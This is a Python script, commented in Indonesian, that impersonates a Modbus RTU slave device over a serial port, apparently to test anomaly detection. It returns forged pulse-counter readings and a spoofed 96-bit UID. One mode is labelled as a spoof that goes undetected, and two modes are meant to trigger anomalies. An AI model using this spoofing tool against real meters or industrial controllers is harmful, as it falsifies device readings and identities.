#!/usr/bin/env python3
# attacker_slave.py — slave Modbus RTU palsu untuk pengujian keamanan
import serial, argparse

def crc16(data: bytes) -> bytes:
    crc = 0xFFFF
    for b in data:
        crc ^= b
        for _ in range(8):
            crc = (crc >> 1) ^ 0xA001 if (crc & 1) else (crc >> 1)
    return bytes([crc & 0xFF, (crc >> 8) & 0xFF])         # low, high

def build_pulse_response(slave_id, forward, backward=0):
    regs = [forward & 0xFFFF, (forward >> 16) & 0xFFFF,
            backward & 0xFFFF, (backward >> 16) & 0xFFFF]
    body = bytes([slave_id, 0x03, len(regs) * 2])
    for r in regs:
        body += bytes([(r >> 8) & 0xFF, r & 0xFF])
    return body + crc16(body)

def build_uid_response(slave_id, uid_int):
    # 96-bit → 6 register big-endian word (MSWord dulu)
    regs = [(uid_int >> (80 - 16 * k)) & 0xFFFF for k in range(6)]
    body = bytes([slave_id, 0x03, len(regs) * 2])
    for r in regs:
        body += bytes([(r >> 8) & 0xFF, r & 0xFF])
    return body + crc16(body)

ap = argparse.ArgumentParser()
ap.add_argument("--port", default="COM10", help="mis. COM10 / /dev/ttyUSB0")
ap.add_argument("--id",   type=int, default=2, help="ID slave palsu")
ap.add_argument("--mode", choices=["normal", "drop", "jump"], default="normal")
ap.add_argument("--base", type=int, default=1000)
ap.add_argument("--uid",  default="0x000000000000000000000000",
                help="96-bit UID hex (mis. 0x0000000000000000000000AB)")
args = ap.parse_args()
uid_int = int(args.uid, 16)

ser = serial.Serial(args.port, 9600, bytesize=8, parity='N', stopbits=1, timeout=0.05)
print(f"[ATTACKER] slave palsu ID={args.id} mode={args.mode} uid={uid_int:#026x} @ {args.port}")
buf = bytearray(); n = 0
while True:
    chunk = ser.read(256)
    if not chunk: continue
    buf += chunk
    i = 0
    while i + 8 <= len(buf):
        if buf[i] == args.id and buf[i+1] == 0x03 and crc16(bytes(buf[i:i+6])) == bytes(buf[i+6:i+8]):
            addr = (buf[i+2] << 8) | buf[i+3]
            if addr == 0x000D:
                ser.write(build_uid_response(args.id, uid_int)); ser.flush()
                print(f"  -> jawab UID @0x000D: {uid_int:#026x}")
                del buf[:i+8]; i = 0; continue
            # addr 0x0000 (atau lainnya) → balas pulse seperti biasa
            if   args.mode == "normal": fwd = args.base + n               # monoton → tak terdeteksi (D/E)
            elif args.mode == "drop":   fwd = args.base if n == 0 else args.base - 500   # turun → anomali (B)
            elif args.mode == "jump":   fwd = args.base if n == 0 else args.base + 50000 # lonjakan → anomali
            ser.write(build_pulse_response(args.id, fwd)); ser.flush(); n += 1
            print(f"  -> jawab #{n}: forward={fwd}")
            del buf[:i+8]; i = 0; continue
        i += 1
    if len(buf) > 256: del buf[:-8]